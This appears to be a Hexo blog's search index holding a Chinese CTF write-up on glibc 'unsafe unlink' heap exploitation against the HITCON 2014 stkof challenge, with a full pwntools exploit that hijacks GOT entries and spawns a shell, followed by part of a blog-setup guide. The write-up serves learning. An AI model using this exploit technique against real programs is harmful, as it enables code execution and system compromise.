<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Heap Exploitation-unlink</title>
      <link href="/article/6fb0.html"/>
      <url>/article/6fb0.html</url>
      
        <content type="html"><![CDATA[<h1 id="Heap-Exploitation-unsafe-unlink"><a href="#Heap-Exploitation-unsafe-unlink" class="headerlink" title="Heap Exploitation - unsafe unlink"></a>Heap Exploitation - unsafe unlink</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>unlink是glibc里的一个宏，是一段代码片段，通常在内存管理系统中使用。为了避免堆内存过度碎片化，当一个非fast bins的堆块被释放时，libc会查看前后堆块是否是释放状态，是就取出合并，这就是unlink。</p><p>unlink主要是从双向链表结构中移除一个节点，该节点通常用于跟踪空闲内存块。目的是将某一空闲的chunk从其所处的bin中脱链。在malloc_consolidate()函数中将fast bins中的空闲chunk，整理到unsorted bins中，在malloc()函数中用于将unsorted bins中的空闲chunk整理到small bins中或者large bins中，以及在malloc()中获得堆空间时，均可能调用unlink()宏。</p><p>在执行free()时会执行int_free()函数，int_free()函数中调用了unlink宏</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">_int_free()&#123;</span><br><span class="line">unlink();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unlink源码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (check_action,</span><br><span class="line">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,</span><br><span class="line">       P, AV);</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在源码中，首先会通过<code>     FD = P-&gt;fd; BK = P-&gt;bk;</code>来将前向和后向指针分别存储。然后进行错误检查，执行<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code>来调整P节点前后的指针，绕过P来移除P节点。之后会检查节点的大小，对更大的节点有额外的检查和调整方法，由于large bins中的一个bin会包含不同大小的chunk，所以还会额外处理fd_nextsize和bk_nextsize。</p><p>ulink过程图示：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326909.png" alt="unlink_smallbin_intro"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>简单来说，由于C语言通过计算偏移来寻找相应的结构体成员，就算堆块的某些成员变量被篡改，libc仍然会认为该位置就是原来的数据，那么就可以通过unlink这一操作来指向伪造的fake fd和fake bk。</p><p>这里简单说一下原理，然后通过复现例题理解。</p><h3 id="检查机制"><a href="#检查机制" class="headerlink" title="检查机制"></a>检查机制</h3><p>在unlink前会检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk != P || BK-&gt;fd != P</span><br></pre></td></tr></table></figure><p>简单来说就是检查前置结点的fd指针和后置结点的bk指针指向的是否都是该结点</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>UAF（Use After Free），可修改 free 状态下 small bins 或是 unsorted bins 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行UAF的chunk</li></ol><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>虽然有检查机制，但是还是比较容易绕过的，设指向可 UAF chunk 的指针的地址为 ptr</p><ul><li><p>修改 fd 为 ptr - 0x18</p></li><li><p>修改 bk 为 ptr - 0x10</p></li><li><p>触发 unlink</p></li></ul><p>ptr 处的指针会变为 ptr - 0x18。</p><h2 id="示例复现"><a href="#示例复现" class="headerlink" title="示例复现"></a>示例复现</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">2014 HITCON stkof</a></p><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>检查保护，64位开启NX和Canary</p><p>函数逻辑就是，检查输入的数字，输入数字执行对应的函数。</p><p>输入1进入函数，会申请一个对应输入大小的chunk，并将chunk的内存指针存储到一个变量中，判断chunk是否创建成功，成功就会将该变量放在bss段的一个未初始化变量中，并输出成功分配的内存块数量。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">size = atoll(s);</span><br><span class="line">v2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> ( !v2 )</span><br><span class="line"><span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">globals[++cnt] = v2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)cnt);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>输入2进入对应函数，首先接收输入，判断对应输入下边的位置是否有chunk，如果有就将再次接收输入，使用fread函数将输入的字符写入地址处，如果输入一个不限制长度的字符串就会造成堆溢出。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">idx = atol(s);</span><br><span class="line"><span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">size = atoll(s);</span><br><span class="line">ptr = globals[idx];</span><br><span class="line"><span class="keyword">for</span> ( i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ptr += i;</span><br><span class="line">  size -= i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入3会进入释放chunk的函数，如果输入的下标有被创建的chunk就释放。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">idx = atol(s);</span><br><span class="line"><span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line"><span class="built_in">free</span>(globals[idx]);</span><br><span class="line">globals[idx] = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><h5 id="1"><a href="#1" class="headerlink" title="1"></a>1</h5><p>先申请一个chunk，查看chunk可以看到有四个</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326922.png" alt="image-20231130183608342"></p><p>第二个是申请的chunk，可以看到申请了0x20的空间（user data 10 + prev_size 8 + size 8），显示0x21是因为prev_inuse标志位为1。能看到还有另外三个chunk，最后一个size很大的是top chunk。</p><blockquote><p>整个堆会在初始化后被当成一个free chunk，成为top chunk，每次用户申请内存时，如果bins中没有合适的chunk，就会从top chunk中进行划分，如果top chunk的大小不够，则调用brk()拓展堆的大小。然后从新的top chunk中进行划分。</p></blockquote><p>第一个和第三个实际上是由于程序本身没有进行setbuf操作，所以在初次使用fget()和printf()执行输入输出时会申请缓冲区。</p><p>那这样就不能利用chunk1进行操作了，chunk1是被两个输入输出申请的chunk包住了，没法利用，也不好利用，不如直接再申请两个chunk2和chunk3，这时候再申请的两个chunk就是连在一起的了，就方便操作，然后用chunk2来溢出到chunk3，执行流程就比较好控制了。</p><p>接下来需要分析一下溢出的效果是什么，如何控制。</p><h5 id="2"><a href="#2" class="headerlink" title="2"></a>2</h5><p>之前知道在编辑时可以构造堆溢出，比如申请三个chunk，编辑第二个，让第二个溢出到第三个。</p><p>申请三个chunk分别为chunk1、chunk2、chunk3，编辑第二个chunk，将其内容改为48字节大小的内容。</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326938.png" alt="image-20231212204344316"></p><p>能够看到chunk3消失了</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326928.png" alt="image-20231212204053662"></p><p>查看chunk2地址的内容可知，未修改前chunk2地址的内容：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326934.png" alt="image-20231212204127065"></p><p>修改后chunk2地址的内容</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326960.png" alt="image-20231212204220845"></p><p>其实就是由于溢出，chunk3的prev_size和size被修改了，导致了识别的上的问题（可能），不过查看0x602140处存放chunk地址的数组发现chunk3也消失了，此处还没弄清楚，应该也是原来指向的地址被修改了导致的。但是确定了可以利用溢出来修改chunk3的chunk头信息。</p><p>实际做题中，第一个chunk的大小无所谓，因为用不到。第二个chunk最好是0x30，第三个不能小于0x80，防止free掉被放到fast bins中。</p><h5 id="3"><a href="#3" class="headerlink" title="3"></a>3</h5><p>利用方法，简单来说就是在chunk2内的data部分来伪造一个chunk，伪造为释放状态，利用堆溢出修改后一个chunk也就是这里的chunk3的prev_size和size，将chunk3的prev_size修改为伪造的chunk大小，并将size的P位置0，以此来绕过检查并触发unlink，触发unsafe unlink。</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326527.png" alt="image-20231214175058501"></p><p>构造fake chunk：</p><ul><li>prev_size：prev_size这里实际上与chunk2相关，但是是不需要合并chunk2的，所以prev_size置零即可</li><li>size：fake chunk只需要fd和bk来完成unlink，而由于需要伪造为释放状态，即P位为0，所以为0x20</li></ul><p>接下来要构造fake chunk的fd和bk。</p><p>在这里需要将0x602140的作为一个chunk来看，将其作为BK。将0x602138处的数据也作为chunk来看，也就是FD。</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326571.png" alt="image-20231216102410933"></p><p>让fake chunk的fd指针指向0x602140，并让bk指针指向0x602138。</p><p>为什么要这么设置呢？前面说过：</p><blockquote><p>由于C语言通过计算偏移来寻找相应的结构体成员，就算堆块的某些成员变量被篡改，libc仍然会认为该位置就是原来的数据</p></blockquote><p>在源码中：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//取要脱链结点的fd指针和bk指针</span></span><br><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line"><span class="comment">//检查</span></span><br><span class="line">FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</span><br><span class="line"><span class="comment">//脱链操作</span></span><br><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><p>也就是说，bk指针是通过 + 0x18来找到的，fd指针是通过起始地址 + 0x10来找到的，二者均通过计算偏移来寻找成员，那么就可以将上面的代码理解为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk == P &lt;=&gt; *(p-&gt;fd+<span class="number">0x18</span>) == P</span><br><span class="line">P-&gt;bk-&gt;fd == P &lt;=&gt; *(p-&gt;bk+<span class="number">0x10</span>) == P</span><br></pre></td></tr></table></figure><p>那么就可以设置fd和bk如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd = &amp;P<span class="number">-0x18</span></span><br><span class="line">P-&gt;bk = &amp;P<span class="number">-0x10</span></span><br></pre></td></tr></table></figure><p>这样实际上就完成了对检查的绕过，利用偏移寻找结构体成员时，找到的仍旧是正确的结点，但是fd和bk指向的是bss段某处的地址。</p><p>这样的话就可以利用已有条件，将fd和bk修改指向为可以控制的某段空间，在这里就是已知的bss段。</p><p>前面分析源码已知了global数组的地址为0x602140，就可以按以下进行设置：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">target = <span class="number">0x602140</span> + <span class="number">0x10</span>    <span class="comment">//global[2]</span></span><br><span class="line">fd = target - <span class="number">0x18</span>          <span class="comment">//P-&gt;fd指向0x602138</span></span><br><span class="line">bk = target - <span class="number">0x10</span><span class="comment">//P-&gt;bk指向0x602140</span></span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326600.png" alt="image-20231216102911951"></p><p>修改chunk2后，fake chunk就与FD和BK构造了一个双向链表。</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326633.png" alt="image-20231216103127670"></p><p>第一个payload：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line"><span class="comment">#fake chunk的prev_size和size，size的P位置0</span></span><br><span class="line">payload1 += p64(fd) + p64(bk)</span><br><span class="line"><span class="comment">#设置fd和bk</span></span><br><span class="line">payload1 += <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span></span><br><span class="line"><span class="comment">#填充剩余的空间</span></span><br><span class="line">payload1 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"><span class="comment">#修改chunk3的prev_size和size分别为fake chunk的大小和size的P位置0</span></span><br></pre></td></tr></table></figure><p>修改后效果</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326662.png" alt="image-20231217182807698"></p><p>查看chunk2和chunk3</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326778.png" alt="image-20231217183154218"></p><h5 id="4"><a href="#4" class="headerlink" title="4"></a>4</h5><p>构造好了fake chunk就要想办法触发unlink，这里再次说明一下unlink是如何实现的。</p><p>在上面构造了fake chunk，以此来实现绕过检测，并将bk和fd指针指向可写的bss段上，并且现在chunk3的prev_size已经被设置为了fake chunk的大小，size的prev_inuse也被置0。此时free掉chunk3，glibc检查chunk3的chunk头就会发现是free状态，将上一个chunk也就是fake chunk拿出来进行合并。</p><p>fake chunk就会被从刚才构造的双向链表中摘除，摘除过程中会执行<code>FD-&gt;bk = BK; BK-&gt;fd =FD;</code></p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326917.png" alt="image-20231216104136377"></p><p>实际上改变的是同一处的地址，但是由于先后顺序，最终被改为0x602138，此时我们就控制了0x602138到0x602150之间，可以在这段区域来继续进行操作。</p><p>free掉chunk3即可，gdb调试看一下。</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326989.png" alt="image-20231217183513869"></p><p>成功控制了这段内存区域。</p><h5 id="5"><a href="#5" class="headerlink" title="5"></a>5</h5><p>控制这段区域后，由于该题没有后门，需要泄露libc基址。</p><p>而由于之前按将原本global数组中存放chunk2地址的位置改写为了0x602138，所以实际上如果修改chunk2的内容是不会写入到chunk2内的，会写到0x602138处。</p><p>那么就可以通过修改chunk2来对global数组来进行部署函数的GOT表地址，再次修改global数组时就会修改GOT表中的真实地址。实现GOT表劫持。</p><p>第二个payload：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload2 += p64(free_got) + p64(puts_got) + p64(atoi_got)</span><br></pre></td></tr></table></figure><p>布置好后，由于chunk0处为free函数的GOT表地址，可以将其修改为put函数的PLT地址，这样调用free就会调用puts函数。如果释放chunk1，就会实现：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(chunk1) -&gt; free(puts_got) -&gt; puts(puts_got)</span><br></pre></td></tr></table></figure><p>将puts函数的真实地址输出。并利用真实地址计算偏移得出system函数的真实地址和binsh的真实地址。</p><p>最后还是老一套，将chunk2的atoi函数GOT地址改为system函数地址，调用atoi就会调用system函数，等待输入时输入&#x2F;bin&#x2F;sh地址，就是调用system(&#x2F;bin&#x2F;sh)，getshell。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;gnome-terminal&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc_chunk</span>(<span class="params">value</span>):</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(value))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">io.sendline(content)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free_chunk</span>(<span class="params">idx</span>):</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602140</span> + <span class="number">0x10</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_chunk(<span class="number">0x100</span>)</span><br><span class="line">malloc_chunk(<span class="number">0x30</span>)</span><br><span class="line">malloc_chunk(<span class="number">0x80</span>)</span><br><span class="line">raw_input(<span class="string">&quot;after malloc three chunks......&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload1 += p64(fd) + p64(bk)</span><br><span class="line">payload1 += <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span></span><br><span class="line">payload1 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, payload1)</span><br><span class="line">raw_input(<span class="string">&quot;after edit chunk2...&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_chunk(<span class="number">3</span>)</span><br><span class="line">raw_input(<span class="string">&quot;after free chunk3...&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;OK\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&quot;atoi&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload2 += p64(free_got) + p64(puts_got) + p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>, payload2)</span><br><span class="line">raw_input(<span class="string">&quot;after edit global...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = p64(puts_plt)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line">raw_input(<span class="string">&quot;after edit chunk0...&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_chunk(<span class="number">1</span>)</span><br><span class="line">raw_input(<span class="string">&quot;after free chunk1...&quot;</span>)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">8</span>:].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_offset = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"> </span><br><span class="line">payload4 = p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>,payload4)</span><br><span class="line">raw_input(<span class="string">&quot;after edit chunk2...&quot;</span>)</span><br><span class="line"> </span><br><span class="line">io.send(p64(binsh_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#改的别人的EXP，打不通就离谱，爬了</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#_2">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/#_2</a></p></li><li><p><a href="https://blog.csdn.net/qq_41202237/article/details/108481889">https://blog.csdn.net/qq_41202237/article/details/108481889</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/article/68d0.html"/>
      <url>/article/68d0.html</url>
      
        <content type="html"><![CDATA[<h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><p>博客崩了一直没修，重搭一下，写一点东西记录一下搭建过程踩的坑。</p><h2 id="前置步骤"><a href="#前置步骤" class="headerlink" title="前置步骤"></a>前置步骤</h2><ul><li>注册github</li><li>下载Git<a href="https://git-scm.com/">Git (git-scm.com)</a></li><li>绑定自己的github账号</li><li>购买域名（这个可以不用买，买的话建议用阿里云，腾讯云的解析记录只能添加三个，有点过于城市化了。）</li></ul><p>以上几步跟着文章做就好，比较简单，注意github已将默认分支master改为main，例如文章中<code>git push origin master</code>的master要改为main。</p><p>其次，如果提示<code>fatal unable to access ‘httpsgithub.comxxxxxxxxxxx.git’ Recv failure Connection was reset</code>，可以尝试进行如下操作：</p><p>在进行过第三步绑定的操作后，输入<code>git config --global -l</code>应该会输出用户名和邮箱</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338862.png" alt="image-20231120215729313"></p><p>如果没有，或者与实际不符，可以通过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;你的新邮箱地址&quot;</span><br><span class="line">git config --global user.name &quot;你的新用户名&quot;</span><br></pre></td></tr></table></figure><p>这两个命令来进行修改</p><p>然后在自己的主机找到：设置-网络与Internet-代理-手动设置代理，修改如下：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338872.png" alt="image-20231120220237904"></p><p>再在git中输入命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy http://127.0.0.1:7890</span><br><span class="line">git config --global https.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>再次输入命令<code>git config --global -l</code>，输出如下：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338877.png" alt="image-20231120220521802"></p><p>这样就可以了。</p><h2 id="安装必要组件"><a href="#安装必要组件" class="headerlink" title="安装必要组件"></a>安装必要组件</h2><h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><p>下载地址：<a href="https://nodejs.org/en/">Node.js (nodejs.org)</a></p><p>正常安装即可，安装好后在cmd检查，输出版本即安装成功。</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338874.png" alt="image-20231120221228798"></p><p>新建两个空文件夹，node_cache、node_global</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338891.png" alt="image-20231220204617613"></p><p>并右键属性-安全，修改user权限</p><p>cmd输入命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set prefix &quot;D:\nodejs\node_global&quot;</span><br><span class="line">npm config set cache &quot;D:\nodejs\node_cache&quot;</span><br></pre></td></tr></table></figure><p>设置环境变量，新建系统变量如下（路径为刚才创建的node_global的路径，后面加上一个node_modules）：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338346.png" alt="image-20231120221813643"></p><p>再将用户变量里的Path的npm修改为新建的node_global的路径</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338380.png" alt="image-20231120221911860"></p><p>点击确定即可。</p><p>在cmd中输入以下命令，文件夹会自己建好</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install webpack -g</span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338412.png" alt="image-20231120222251829"></p><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><p>Hexo是博客的框架，当然还有其他框架，可以自己选择。</p><p>先创建仓库，点击右上角头像-Your repositories，然后点击New新建仓库</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338459.png" alt="image-20231120222551483"></p><p>输入<code>自己的用户名.github.io</code>为仓库名，注意选择为Public，然后Create repository创建仓库</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338498.png" alt="image-20231120222910921"></p><p>接下来安装Hexo，D盘新建文件夹blog，在此处打开git bash，输入以下命令安装Hexo</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222338521.png" alt="image-20231120223824428"></p><blockquote><p> 如果提示command not found，<a 